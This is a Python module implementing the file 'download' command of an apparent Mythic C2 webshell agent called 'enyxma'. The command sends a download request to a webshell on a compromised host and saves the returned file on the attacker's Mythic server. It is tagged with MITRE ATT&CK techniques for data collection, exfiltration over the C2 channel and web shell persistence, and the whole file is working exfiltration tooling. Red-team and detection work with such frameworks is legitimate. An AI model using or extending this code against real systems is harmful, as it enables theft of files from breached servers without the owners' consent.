import pathlib
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from enyxma.WebshellRPC import WebshellRPC
import logging

logger = logging.getLogger(__name__)

class DownloadArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(name="file_path",
                             type=ParameterType.String,
                             description="Remote file path to download")
        ]
        
    async def parse_arguments(self):
        # If no file path is provided, raise an error.
        if len(self.command_line.strip()) <= 0:
            raise ValueError("Missing file path")
        elif self.command_line.strip()[0] == '{':
            self.load_args_from_json_string(self.command_line.strip())
        else:
            self.add_arg("file_path", self.command_line.strip())
        logger.info(f"DownloadArguments parsed: {self.args}")

class DownloadCommand(CommandBase):
    cmd = "download"
    needs_admin = False
    help_cmd = "download <file_path>"
    description = "Download a file from the remote system to the Mythic server using the webshell's native file functions"
    version = 1
    supported_ui_features = ["file_browser:download"]
    author = "@Termindiego25"
    argument_class = DownloadArguments
    browser_script = BrowserScript(script_name="download", author="@Termindiego25", for_new_ui=True)
    # Map the command to the appropriate MITRE ATT&CK techniques
    attackmapping = ["T1005", "T1041", "T1071.001", "T1105", "T1132.001", "T1505.003"]

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        """
        This function creates the task for downloading a file and sends the download command 
        to the remote webshell.
        """
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=False,
            Completed=True,
        )
        # Extract the file path and filename
        user_input = taskData.args.get_arg("file_path")
        filename = pathlib.Path(user_input).name
        response.DisplayParams = filename

        # Construct the command in the form "download <file_path>"
        command = f"download {user_input}"
        logger.info(f"Preparing download command: {command}")

        try:
            # Determine the request method from the C2 profile parameters
            requestType = taskData.C2Profiles[0].Parameters.get("request_type", "POST").upper()
            logger.info(f"Request type for download: {requestType}")
            
            # Dispatch the command based on the chosen HTTP method
            if requestType == "GET":
                response_data = await WebshellRPC.GetRequest(
                    taskData.Payload.UUID, command.encode(), taskData
                )
            else:
                response_data = await WebshellRPC.PostRequest(
                    taskData.Payload.UUID, command.encode(), taskData
                )

            # Check if the response data is empty (e.g., file not found or no output)
            if len(response_data) == 0:
                logger.warning("Received empty response data from the webshell for download command.")
                taskData.args.set_manual_args(command)
                response.Completed = True
                response.Success = True
                return response
            
            # Create the file in Mythic using the downloaded file content
            file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
                TaskID=taskData.Task.ID,
                FileContents=response_data,
                RemotePathOnTarget=user_input,
                Filename=filename,
                IsDownloadFromAgent=True,
                IsScreenshot=False,
                DeleteAfterFetch=False,
            ))
            
            if file_resp.Success:
                msg = f"Successfully downloaded file {filename}\nFileID: {file_resp.AgentFileId}"
                logger.info(msg)
                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                    TaskID=taskData.Task.ID,
                    Response=msg.encode()
                ))
            else:
                err_msg = f"Failed to save file. Error: {file_resp.Error}"
                logger.error(err_msg)
                response.TaskStatus = "error: failed to save file"
                response.Error = file_resp.Error

            response.Success = True

        except Exception as e:
            err_msg = f"Error during file download: {str(e)}"
            logger.exception(err_msg)
            response.TaskStatus = "error: processing"
            response.Error = err_msg

        if response.Error != "":
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=response.Error.encode(),
            ))
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        """
        Process the final response from the download command execution.
        It creates the file in Mythic and sends a final success/failure message.
        """
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        filename = pathlib.Path(task.Task.DisplayParams).name
        file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
            TaskID=task.Task.ID,
            FileContents=response.encode("UTF-8"),
            RemotePathOnTarget=task.Task.DisplayParams,
            Filename=filename,
            IsDownloadFromAgent=True,
            IsScreenshot=False,
            DeleteAfterFetch=False,
        ))
        if file_resp.Success:
            msg = f"Successfully downloaded file {filename}\nFileID: {file_resp.AgentFileId}"
            logger.info(msg)
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=task.Task.ID,
                Response=msg.encode(),
            ))
        else:
            err = file_resp.Error
            logger.error(f"Error creating file: {err}")
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=task.Task.ID,
                Response=err.encode("UTF8"),
            ))
        return resp